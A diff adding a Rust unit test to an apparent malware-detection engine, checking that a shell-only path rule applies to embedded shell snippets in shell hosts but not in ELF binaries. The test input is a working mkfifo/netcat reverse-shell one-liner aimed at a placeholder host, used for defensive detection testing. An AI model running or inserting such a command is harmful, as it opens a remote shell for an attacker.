@@ -105,6 +105,65 @@ traits:
     assert!(!findings.iter().any(|f| f.id == "test/snippet::many-lines"));
 }
 
+/// A shell snippet carved out of an ELF has no name of its own: `type: path`
+/// reads the ELF's. A `for: [shell]` path rule must not match there, or the
+/// directory the ELF sits in (here `benchmarks/`) becomes a shell finding on
+/// a binary. The same snippet in a shell host still matches.
+#[test]
+fn path_rule_on_plain_snippet_must_admit_the_host_type() {
+    let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join("traits.yaml");
+    std::fs::write(
+        &path,
+        r#"
+defaults:
+  for: [shell]
+  platforms: [unix, windows]
+traits:
+  - id: test/snippet::benchmark-path
+    desc: Benchmark path
+    crit: notable
+    if: {type: path, regex: '(^|[\\/])benchmarks[\\/]'}
+"#,
+    )
+    .unwrap();
+    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap();
+    let engine = crate::Engine::from_rules(std::sync::Arc::new(mapper));
+    let code = "mkfifo /tmp/f; sh -c 'sh </tmp/f | nc example.test 4444 >/tmp/f' 2>/dev/null";
+    let snippet_findings = |host: &str, host_type: FileType| {
+        let result = analyze_embedded_haystack(
+            host,
+            code,
+            32,
+            &[],
+            Some(crate::types::binary::StringType::ShellCmd),
+            &engine,
+            0,
+            Some(&host_type),
+        )
+        .unwrap();
+        let EmbeddedAnalysisResult::PlainEmbedded(findings) = result else {
+            panic!("plain string must remain a plain embedded unit");
+        };
+        findings
+    };
+
+    let elf = snippet_findings("/data/benchmarks/sample/manager", FileType::Elf);
+    assert!(
+        elf.iter().any(|f| f.id == "metadata/lang/embedded::shell"),
+        "the snippet itself must still be analyzed as shell"
+    );
+    assert!(
+        !elf.iter().any(|f| f.id == "test/snippet::benchmark-path"),
+        "an ELF host's path must not satisfy a shell-only path rule: {elf:?}"
+    );
+    let shell = snippet_findings("/data/benchmarks/sample/run.sh", FileType::Shell);
+    assert!(
+        shell.iter().any(|f| f.id == "test/snippet::benchmark-path"),
+        "a shell host's path still satisfies the shell path rule: {shell:?}"
+    );
+}
+
 fn make_string_info(value: &str) -> StringInfo {
     StringInfo {
         value: (value.to_string()).into(),
